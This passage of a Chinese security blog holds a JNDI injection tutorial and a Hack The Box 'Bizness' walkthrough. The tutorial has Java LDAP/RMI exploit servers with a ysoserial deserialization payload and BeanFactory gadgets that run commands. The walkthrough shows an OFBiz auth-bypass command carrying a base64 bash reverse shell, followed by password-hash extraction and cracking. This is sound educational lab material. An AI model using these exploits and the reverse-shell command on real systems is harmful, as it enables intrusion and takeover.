SGFzaE1hcAUH2sHDFmDRAwACRgAKbG9hZEZhY3RvckkACXRocmVzaG9sZHhwP0AAAAAAAAB3CAAAABAAAAAAeHh4</span><br></pre></td></tr></table></figure>

<p>LDAP Server关键代码如下，我们在javaSerializedData字段内填入刚刚生成的反序列化payload数据：</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> jndi_rmi_injection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServer;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryDirectoryServerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.InMemoryListenerConfig;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryInterceptedSearchResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.listener.interceptor.InMemoryOperationInterceptor;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.Entry;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPException;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.LDAPResult;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.ldap.sdk.ResultCode;</span><br><span class="line"><span class="keyword">import</span> com.unboundid.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.net.ServerSocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.SocketFactory;</span><br><span class="line"><span class="keyword">import</span> javax.net.ssl.SSLSocketFactory;</span><br><span class="line"><span class="keyword">import</span> java.net.InetAddress;</span><br><span class="line"><span class="keyword">import</span> java.net.MalformedURLException;</span><br><span class="line"><span class="keyword">import</span> java.text.ParseException;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">ldap_javaSerializedData_server</span> &#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="type">String</span> <span class="variable">LDAP_BASE</span> <span class="operator">=</span> <span class="string">&quot;dc=example,dc=com&quot;</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span> <span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="type">int</span> <span class="variable">port</span> <span class="operator">=</span> <span class="number">1389</span>;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">InMemoryDirectoryServerConfig</span> <span class="variable">config</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServerConfig</span>(LDAP_BASE);</span><br><span class="line">            config.setListenerConfigs(<span class="keyword">new</span> <span class="title class_">InMemoryListenerConfig</span>(</span><br><span class="line">                    <span class="string">&quot;listen&quot;</span>,</span><br><span class="line">                    InetAddress.getByName(<span class="string">&quot;0.0.0.0&quot;</span>),</span><br><span class="line">                    port,</span><br><span class="line">                    ServerSocketFactory.getDefault(),</span><br><span class="line">                    SocketFactory.getDefault(),</span><br><span class="line">                    (SSLSocketFactory) SSLSocketFactory.getDefault()));</span><br><span class="line"></span><br><span class="line">            config.addInMemoryOperationInterceptor(<span class="keyword">new</span> <span class="title class_">OperationInterceptor</span>());</span><br><span class="line">            <span class="type">InMemoryDirectoryServer</span> <span class="variable">ds</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InMemoryDirectoryServer</span>(config);</span><br><span class="line">            System.out.println(<span class="string">&quot;Listening on 0.0.0.0:&quot;</span> + port);</span><br><span class="line">            ds.startListening();</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span> ( Exception e ) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">class</span> <span class="title class_">OperationInterceptor</span> <span class="keyword">extends</span> <span class="title class_">InMemoryOperationInterceptor</span> &#123;</span><br><span class="line">        <span class="keyword">public</span> <span class="title function_">OperationInterceptor</span> <span class="params">()</span> &#123;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="meta">@Override</span></span><br><span class="line">        <span class="keyword">public</span> <span class="keyword">void</span> <span class="title function_">processSearchResult</span> <span class="params">( InMemoryInterceptedSearchResult result )</span> &#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">base</span> <span class="operator">=</span> result.getRequest().getBaseDN();</span><br><span class="line">            <span class="type">Entry</span> <span class="variable">e</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">Entry</span>(base);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                sendResult(result, base, e);</span><br><span class="line">            &#125;</span><br><span class="line">            <span class="keyword">catch</span> ( Exception e1 ) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">protected</span> <span class="keyword">void</span> <span class="title function_">sendResult</span> <span class="params">( InMemoryInterceptedSearchResult result, String base, Entry e )</span> <span class="keyword">throws</span> LDAPException, MalformedURLException &#123;</span><br><span class="line">            e.addAttribute(<span class="string">&quot;javaClassName&quot;</span>, <span class="string">&quot;Exploit&quot;</span>);</span><br><span class="line">            <span class="keyword">try</span> &#123;</span><br><span class="line">                <span class="comment">// java -jar ysoserial.jar CommonsCollections6 &#x27;open /System/Applications/Calculator.app&#x27;|base64</span></span><br><span class="line">                e.addAttribute(<span class="string">&quot;javaSerializedData&quot;</span>, Base64.decode(<span class="string">&quot;rO0ABXNyABFqYXZhLnV0aWwuSGFzaFNldLpEhZWWuLc0AwAAeHB3DAAAAAI/QAAAAAAAAXNyADRvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMua2V5dmFsdWUuVGllZE1hcEVudHJ5iq3SmznBH9sCAAJMAANrZXl0ABJMamF2YS9sYW5nL09iamVjdDtMAANtYXB0AA9MamF2YS91dGlsL01hcDt4cHQAA2Zvb3NyACpvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMubWFwLkxhenlNYXBu5ZSCnnkQlAMAAUwAB2ZhY3Rvcnl0ACxMb3JnL2FwYWNoZS9jb21tb25zL2NvbGxlY3Rpb25zL1RyYW5zZm9ybWVyO3hwc3IAOm9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5mdW5jdG9ycy5DaGFpbmVkVHJhbnNmb3JtZXIwx5fsKHqXBAIAAVsADWlUcmFuc2Zvcm1lcnN0AC1bTG9yZy9hcGFjaGUvY29tbW9ucy9jb2xsZWN0aW9ucy9UcmFuc2Zvcm1lcjt4cHVyAC1bTG9yZy5hcGFjaGUuY29tbW9ucy5jb2xsZWN0aW9ucy5UcmFuc2Zvcm1lcju9Virx2DQYmQIAAHhwAAAABXNyADtvcmcuYXBhY2hlLmNvbW1vbnMuY29sbGVjdGlvbnMuZnVuY3RvcnMuQ29uc3RhbnRUcmFuc2Zvcm1lclh2kBFBArGUAgABTAAJaUNvbnN0YW50cQB+AAN4cHZyABFqYXZhLmxhbmcuUnVudGltZQAAAAAAAAAAAAAAeHBzcgA6b3JnLmFwYWNoZS5jb21tb25zLmNvbGxlY3Rpb25zLmZ1bmN0b3JzLkludm9rZXJUcmFuc2Zvcm1lcofo/2t7fM44AgADWwAFaUFyZ3N0ABNbTGphdmEvbGFuZy9PYmplY3Q7TAALaU1ldGhvZE5hbWV0ABJMamF2YS9sYW5nL1N0cmluZztbAAtpUGFyYW1UeXBlc3QAEltMamF2YS9sYW5nL0NsYXNzO3hwdXIAE1tMamF2YS5sYW5nLk9iamVjdDuQzlifEHMpbAIAAHhwAAAAAnQACmdldFJ1bnRpbWV1cgASW0xqYXZhLmxhbmcuQ2xhc3M7qxbXrsvNWpkCAAB4cAAAAAB0AAlnZXRNZXRob2R1cQB+ABsAAAACdnIAEGphdmEubGFuZy5TdHJpbmeg8KQ4ejuzQgIAAHhwdnEAfgAbc3EAfgATdXEAfgAYAAAAAnB1cQB+ABgAAAAAdAAGaW52b2tldXEAfgAbAAAAAnZyABBqYXZhLmxhbmcuT2JqZWN0AAAAAAAAAAAAAAB4cHZxAH4AGHNxAH4AE3VyABNbTGphdmEubGFuZy5TdHJpbmc7rdJW5+kde0cCAAB4cAAAAAF0AChvcGVuIC9TeXN0ZW0vQXBwbGljYXRpb25zL0NhbGN1bGF0b3IuYXBwdAAEZXhlY3VxAH4AGwAAAAFxAH4AIHNxAH4AD3NyABFqYXZhLmxhbmcuSW50ZWdlchLioKT3gYc4AgABSQAFdmFsdWV4cgAQamF2YS5sYW5nLk51bWJlcoaslR0LlOCLAgAAeHAAAAABc3IAEWphdmEudXRpbC5IYXNoTWFwBQfawcMWYNEDAAJGAApsb2FkRmFjdG9ySQAJdGhyZXNob2xkeHA/QAAAAAAAAHcIAAAAEAAAAAB4eHg=&quot;</span>));</span><br><span class="line">            &#125; <span class="keyword">catch</span> (ParseException e1) &#123;</span><br><span class="line">                e1.printStackTrace();</span><br><span class="line">            &#125;</span><br><span class="line">            result.sendSearchEntry(e);</span><br><span class="line">            result.setResult(<span class="keyword">new</span> <span class="title class_">LDAPResult</span>(<span class="number">0</span>, ResultCode.SUCCESS));</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>模拟受害者进行JNDI lookup操作，或者使用Fastjson等漏洞模拟触发，即可看到弹计算器的命令被执行。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> jndi_rmi_injection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.InitialContext;</span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">LDAPClient</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> NamingException&#123;</span><br><span class="line">        <span class="keyword">try</span>&#123;</span><br><span class="line">            <span class="type">String</span> <span class="variable">url</span> <span class="operator">=</span> <span class="string">&quot;ldap://localhost:1389/Exploit&quot;</span>;</span><br><span class="line">            <span class="type">InitialContext</span> <span class="variable">initialContext</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">InitialContext</span>();</span><br><span class="line">            initialContext.lookup(url);</span><br><span class="line">        &#125;<span class="keyword">catch</span> (Exception e)&#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这种绕过方式需要利用一个本地的反序列化利用链，如CommonsCollections或者结合Fastjson等漏洞入口点和JdbcRowSetImpl进行组合利用。</p>
<h3 id="利用CLASSPATH不那么常见的类构造gadget"><a href="#利用CLASSPATH不那么常见的类构造gadget" class="headerlink" title="利用CLASSPATH不那么常见的类构造gadget"></a>利用CLASSPATH不那么常见的类构造gadget</h3><h4 id="1、javax-management-loading-MLet-探测类是否存在"><a href="#1、javax-management-loading-MLet-探测类是否存在" class="headerlink" title="1、javax.management.loading.MLet 探测类是否存在"></a>1、javax.management.loading.MLet 探测类是否存在</h4><p>javax.management.loading.MLet这个类，通过其loadClass方法可以探测目标是否存在某个可利用类（例如java原生反序列化的gadget）</p>
<p>由于javax.management.loading.MLet继承自URLClassLoader，其addURL方法会访问远程服务器，而loadClass方法可以检测目标是否存在某个类，因此可以结合使用，检测某个类是否存在。</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> jndi_rmi_injection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">MLet_rmi_server</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1098</span>);</span><br><span class="line">            <span class="type">ResourceRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;javax.management.loading.MLet&quot;</span>, (String)<span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, (String)<span class="literal">null</span>);</span><br><span class="line">            ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;a=loadClass,b=addURL,c=loadClass&quot;</span>));</span><br><span class="line">            ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;a&quot;</span>, <span class="string">&quot;javax.el.ELProcessor&quot;</span>));</span><br><span class="line">            ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;b&quot;</span>, <span class="string">&quot;http://127.0.0.1:8081/&quot;</span>));</span><br><span class="line">            ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;c&quot;</span>, <span class="string">&quot;andrew_hann_class&quot;</span>));</span><br><span class="line">            <span class="comment">//触发点在resourceRef的getObjectInstance()方法中</span></span><br><span class="line">            <span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(ref);</span><br><span class="line">            registry.bind(<span class="string">&quot;Exploit&quot;</span>, referenceWrapper);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p><img src="https://img2023.cnblogs.com/blog/532548/202310/532548-20231019155628377-1477468089.png" alt="img"></p>
<p>上面出现404，则说明前面对ELProcessor类的加载成功了。当loadClass需要加载的类不存在时，则会直接报错，不进入远程类的访问，因此http端收不到GET请求。 </p>
<h4 id="2、org-mvel2-sh-ShellSession-exec"><a href="#2、org-mvel2-sh-ShellSession-exec" class="headerlink" title="2、org.mvel2.sh.ShellSession.exec()"></a>2、org.mvel2.sh.ShellSession.exec()</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">&lt;dependency&gt;</span><br><span class="line">    &lt;groupId&gt;org.mvel&lt;/groupId&gt;</span><br><span class="line">    &lt;artifactId&gt;mvel2&lt;/artifactId&gt;</span><br><span class="line">    &lt;version&gt;2.4.12.Final&lt;/version&gt;</span><br><span class="line">&lt;/dependency&gt;</span><br></pre></td></tr></table></figure>

<p>服务端代码如下，</p>
<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">package</span> jndi_rmi_injection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.sun.jndi.rmi.registry.ReferenceWrapper;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.LocateRegistry;</span><br><span class="line"><span class="keyword">import</span> java.rmi.registry.Registry;</span><br><span class="line"><span class="keyword">import</span> javax.naming.StringRefAddr;</span><br><span class="line"><span class="keyword">import</span> org.apache.naming.ResourceRef;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title class_">mvel2_rmi_server</span> &#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title function_">main</span><span class="params">(String[] args)</span> &#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            <span class="type">Registry</span> <span class="variable">registry</span> <span class="operator">=</span> LocateRegistry.createRegistry(<span class="number">1098</span>);</span><br><span class="line">            <span class="type">ResourceRef</span> <span class="variable">ref</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ResourceRef</span>(<span class="string">&quot;org.mvel2.sh.ShellSession&quot;</span>, (String)<span class="literal">null</span>, <span class="string">&quot;&quot;</span>, <span class="string">&quot;&quot;</span>, <span class="literal">true</span>, <span class="string">&quot;org.apache.naming.factory.BeanFactory&quot;</span>, (String)<span class="literal">null</span>);</span><br><span class="line">            ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;forceString&quot;</span>, <span class="string">&quot;a=exec&quot;</span>));</span><br><span class="line">            ref.add(<span class="keyword">new</span> <span class="title class_">StringRefAddr</span>(<span class="string">&quot;a&quot;</span>, <span class="string">&quot;push Runtime.getRuntime().exec(\&quot;open /System/Applications/Calculator.app\&quot;);&quot;</span>));</span><br><span class="line">            <span class="comment">//触发点在resourceRef的getObjectInstance()方法中</span></span><br><span class="line">            <span class="type">ReferenceWrapper</span> <span class="variable">referenceWrapper</span> <span class="operator">=</span> <span class="keyword">new</span> <span class="title class_">ReferenceWrapper</span>(ref);</span><br><span class="line">            registry.bind(<span class="string">&quot;Exploit&quot;</span>, referenceWrapper);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (Exception e) &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>参考链接： </p>
<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">https://docs.oracle.com/javase/1.5.0/docs/guide/rmi/codebase.html </span><br><span class="line">https://johnfrod.top/%E5%B7%A5%E5%85%B7/ysoserial-%E5%AE%89%E8%A3%85%E4%BD%BF%E7%94%A8%E8%B0%83%E8%AF%95%E6%95%99%E7%A8%8B/</span><br><span class="line">https://github.com/kxcode/JNDI-Exploit-Bypass-Demo </span><br><span class="line">https://kingx.me/Restrictions-and-Bypass-of-JNDI-Manipulations-RCE.html</span><br><span class="line">https://zhuanlan.zhihu.com/p/471482692</span><br><span class="line">https://chenlvtang.top/2021/09/15/JDK8u191-%E7%AD%89%E9%AB%98%E7%89%88%E6%9C%AC%E4%B8%8B%E7%9A%84JNDI%E6%B3%A8%E5%85%A5/</span><br><span class="line">https://koalr.me/posts/commonscollections-deserialization/</span><br><span class="line">https://myzxcg.com/2021/10/Java-JNDI%E5%88%86%E6%9E%90%E4%B8%8E%E5%88%A9%E7%94%A8/#contents:%E5%88%A9%E7%94%A8ldap%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%95%B0%E6%8D%AE</span><br><span class="line">https://y4er.com/posts/use-local-factory-bypass-jdk-to-jndi/ </span><br><span class="line">https://www.cnblogs.com/expl0it/p/13882169.html</span><br><span class="line">https://blog.csdn.net/weixin_45682070/article/details/121888247</span><br><span class="line">https://www.cnblogs.com/zpchcbd/p/14941783.html</span><br><span class="line">https://y4er.com/posts/attack-java-jndi-rmi-ldap-2/</span><br><span class="line">https://www.cnblogs.com/bitterz/p/15946406.html</span><br><span class="line">https://tttang.com/archive/1405/</span><br></pre></td></tr></table></figure>
	
	</div>
  <a type="button" href="/2024/01/16/JNDI注入/#more" class="btn btn-default more">Read More</a>
</div>

		
			
					
						<!-- display as entry -->
						<div class="row">
							<div class="col-md-8">
								<h3 class="title">
									<a href="/2024/01/11/HTB-bizness-wp/" >HTB-bizness-wp</a>
								</h3>
							</div>
							<div class="col-md-4">
								<div class="date">post @ 2024-01-11
								</div>
							</div>
						</div>
						
								
			<div class="entry">
  <div class="row">
	
	
		<h2 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h2><p>nmap 扫描  常规开放端口22, 80, 443</p>
<p>dirsearch 后收集到一些路由<code>/content</code>, <code>/accounting</code>, <code>/control</code>  但都会跳转到登录界面</p>
<p><img src="https://github.com/Antel0p3/Antel0p3.github.io/blob/main/2024/01/11/HTB-bizness-wp/0x1.png?raw=true" alt="img"></p>
<p>从右下角可以看到用的框架是 <code>Apache OFBiz. Release 18.12</code>  </p>
<p>搜索可以发现<code>(CVE-2023-49070 and CVE-2023-51467)</code>  </p>
<p>以及攻击利用的payload <a target="_blank" rel="noopener" href="https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass/blob/master/exploit.py">https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass/blob/master/exploit.py</a></p>
<h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><p>下载<a target="_blank" rel="noopener" href="https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass/blob/master/exploit.py%E5%92%8Chttps://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar">https://github.com/jakabakos/Apache-OFBiz-Authentication-Bypass/blob/master/exploit.py和https://github.com/frohoff/ysoserial/releases/download/v0.0.6/ysoserial-all.jar</a> 之后  执行命令</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">python3 exploit.py --url https://bizness.htb/ --cmd <span class="string">&#x27;bash -c &#123;echo,YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMjQvOTExMSAwPiYxCg==&#125;|&#123;base64,-d&#125;|&#123;bash,-i&#125;&#x27;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 这里的YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNC4xMjQvOTExMSAwPiYxCg==为&#x27;bash -i &gt;&amp; /dev/tcp/10.10.14.124/9111 0&gt;&amp;1&#x27;的base64编码</span></span><br><span class="line"><span class="comment"># 另外开一个terminal nc -lvnp 9111</span></span><br></pre></td></tr></table></figure>

<p>即可获得反弹shell</p>
<h2 id="权限提升"><a href="#权限提升" class="headerlink" title="权限提升"></a>权限提升</h2><p>下载linpeas.sh  执行后发现有derby  筛选所有相关的dat文件内容 <code>find / -name &quot;*.dat&quot;</code> 进入到目录<code>/opt/ofbiz/runtime/data/derby/ofbiz/seg0</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">grep -arion -E <span class="string">&#x27;(\w+\W+)&#123;0,5&#125;password(\W+\w+)&#123;0,5&#125;&#x27;</span></span><br></pre></td></tr></table></figure>

<p>可以得到一个可疑哈希  <code>$SHA$d$uP0_QaVBpDWFeo8-dRzDqRwXQ2I</code></p>
<p>这里为SHA1哈希 且salt为d  , _换成&#x2F;, -换成+</p>
<p>用cyberchef从base64转到hex得到 <code>b8fd3f41a541a435857a8f3e751cc3a91c174362</code> </p>
<p>接着用hashcat爆破  hash文件内容：<code>b8fd3f41a541a435857a8f3e751cc3a91c174362:d</code></p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashcat -m 120 -a 0 <span class="built_in">hash</span> /usr/share/wordlists/rockyou.txt</span><br></pre></td></tr></table></figure>

<p>得到结果  密码即为monkeybizness</p>
<figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">b8fd3f41a541a435857a8f3e751cc3a91c174362:d:monkeybizness  </span><br><span class="line">                                                          </span><br><span class="line">Session..........: hashcat</span><br><span class="line">Status...........: Cracked</span><br><span class="line">Hash.Mode........: 120 (sha1(<span class="variable">$salt</span>.<span class="variable">$pass</span>))</span><br><span class="line">Hash.Target......: b8fd3f41a541a435857a8f3e751cc3a91c174362:d</span><br><span class="line">Time.Started.....: Thu Jan 11 23:10:55 2024 (13 secs)</span><br><span class="line">Time.Estimated...: Thu Jan 11 23:11:08 2024 (0 secs)</span><br><span class="line">Kernel.Feature...: Pure Kernel</span><br><span class="line">Guess.Base.......: File (/usr/share/wordlists/rockyou.txt)</span><br><span class="line">Guess.Queue......: 1/1 (100.00%)</span><br><span class="line">Speed.<span class="comment">#1.........:  3346.2 kH/s (0.09ms) @ Accel:512 Loops:1 Thr:1 Vec:8</span></span><br><span class="line">Recovered........: 1/1 (100.00%) Digests (total), 1/1 (100.00%) Digests (new)</span><br><span class="line">Progress.........: 1478656/14344385 (10.31%)</span><br><span class="line">Rejected.........: 0/1478656 (0.00%)</span><br><span class="line">Restore.Point....: 1477632/14344385 (10.30%)</span><br><span class="line">Restore.Sub.<span class="comment">#1...: Salt:0 Amplifier:0-1 Iteration:0-1</span></span><br><span class="line">Candidate.Engine.: Device Generator</span><br><span class="line">Candidates.<span class="comment">#1....: montano13 -&gt; monkey-moo</span></span><br><span class="line">Hardware.Mon.<span class="comment">#1..: Util: 43%</span></span><br></pre></td></tr></table></figure>

<p>su切换为root 密码输入monkeybizness 成功提权 </p>

	
	</div>
  <a type="button" href="/2024/01/11/HTB-bizness-wp/#more" class="btn btn-default more">Read More</a>
</div>

		
			
					
						<!-- display as entry -->
						<div class="row">
							<div class="col-md-8">
								<h3 class="title">
									<a href="/2024/01/10/node反序列化RCE/" >node反序列化RCE(CVE-2017-5941)</a>
								</h3>
							</div>
							<div class="col-md-4">
